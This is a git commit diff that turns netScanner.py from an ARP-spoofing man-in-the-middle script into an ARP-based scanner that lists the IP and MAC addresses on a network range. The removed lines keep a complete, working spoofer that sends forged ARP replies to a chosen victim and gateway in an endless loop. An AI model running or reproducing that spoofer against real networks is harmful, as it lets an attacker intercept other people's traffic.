df5f765a37e6fb6aa52e0949d5d19b77ca5509d7
Orion <hashingpro770@gmail.com>
2025-04-17 19:49:32 +0300

    Update netScanner.py

--- netScanner.py
+++ netScanner.py
@@ -1,53 +1,38 @@
-
-#? Exploiting APR Vulneribility By Manipulates ARB Cach
-#! MITM Attack
-
-#+ Requirements
-"""
-IP For Both The Router And The Victim
-Mac-Address For Both The Router And The Victim
-"""
-
-import optparse
-import time
 import scapy.all as scapy
-
+import optparse
 
 def get_args():
     parser = optparse.OptionParser()
-    parser.add_option("-t", "--target",dest="target_ip", help="Specify Victim IP Address")
-    parser.add_option("-r", "--router",dest="router_ip", help="Specify Getway IP Address")
+    parser.add_option("-r", "--range", dest="ip_range", help="Specify IP range (e.g. 192.168.1.1/24)")
+    parser.add_option("-i", "--interface", dest="interface", help="Specify network interface (e.g. eth0, wlan0)")
     options, _ = parser.parse_args()
-    
-    
-    if not options.target_ip:
-        parser.error("[-] Please Enter Target IP -t <IP>")
-        parser.error("[-] -h --help For More Help")
-    if not options.router_ip:
-        parser.error("[-] Please Enter Router IP -r <IP>")
-        parser.error("[-] -h --help For More Help")
+
+    if not options.ip_range:
+        parser.error("[-] Please enter an IP range using -r <range>")
+    if not options.interface:
+        parser.error("[-] Please enter an interface using -i <interface>")
+
     return options
 
+def scan(ip_range, interface):
+    arp_request = scapy.ARP(pdst=ip_range)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
+
+    clients = []
+    for element in answered:
+        client = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        clients.append(client)
+
+    return clients
+
+def print_result(results):
+    print("IP\t\t\tMAC Address")
+    print("-" * 40)
+    for client in results:
+        print(f"{client['ip']}\t\t{client['mac']}")
 
 options = get_args()
-spoof_ip = options.router_ip
-target_ip = options.target_ip
-
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = arp_broadcast/arp_request
-    answer = scapy.srp(arp_request_broadcast, timeout=2,verbose=False,iface="eth0")[0]
-    return answer[0][1].hwsrc
-
-
-def spoof(target_ip,spoof_ip):
-    target_mac = get_mac(target_ip)
-    spoof_mac = get_mac(spoof_ip)
-    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip,)
-    scapy.send(arp_response, verbose=False)
-    
-    
-while True:
-    time.sleep(2)
-    spoof(target_ip,spoof_ip)
+scan_results = scan(options.ip_range, options.interface)
+print_result(scan_results)
